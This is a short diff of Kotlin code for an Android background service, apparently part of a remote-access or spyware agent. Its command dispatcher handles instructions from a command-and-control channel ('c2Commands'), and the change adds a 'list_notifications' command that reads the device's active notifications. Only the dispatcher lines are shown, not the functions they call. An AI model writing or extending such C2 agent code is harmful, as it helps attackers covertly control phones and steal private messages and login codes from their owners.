@@ -583,6 +583,8 @@ class AgentService : Service() {
 
                                 command == "network_info" -> c2Commands.getNetworkInfo()
 
+                                command == "list_notifications" -> c2Commands.getActiveNotifications()
+
                                 command.startsWith("notify ") -> {
                                     val payload = command.substringAfter("notify ")
                                     val parts = payload.split("|", limit = 2)
